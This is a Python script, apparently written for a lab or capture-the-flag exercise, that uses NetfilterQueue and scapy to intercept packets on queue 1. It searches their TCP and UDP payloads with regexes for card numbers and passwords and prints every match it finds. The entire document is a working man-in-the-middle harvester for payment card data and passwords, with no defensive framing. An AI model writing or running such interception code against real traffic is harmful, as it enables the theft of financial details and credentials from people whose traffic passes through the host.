from netfilterqueue import NetfilterQueue
from scapy.all import *
import re

card_number_re = re.compile(r'cc --- (\d{4}\.\d{4}\.\d{4}\.\d{4})')
password_re = re.compile(r'pwd --- ([0-9A-Z:;<=>?@]+)')

traffic_started = False

def print_and_accept(pkt):
    global traffic_started
    if not traffic_started:
        print('Traffic is starting...')
        traffic_started = True

    ip = IP(pkt.get_payload())

    for layer in [TCP, UDP]:
        if ip.haslayer(layer):
            payload = str(ip[layer].payload)
                
            # Try to find  card number
            card_numbers = card_number_re.findall(payload)
            if card_numbers:
                print('     -----cc----- Card number(s):', ', '.join(card_numbers))
            
            # Try to find password
            passwords = password_re.findall(payload)
            if passwords:
                print('     -----pwd----- Password(s):', ', '.join(passwords))
            break

    pkt.accept()

nfqueue = NetfilterQueue()
nfqueue.bind(1, print_and_accept)
try:
    nfqueue.run()
except KeyboardInterrupt:
    print('')

nfqueue.unbind()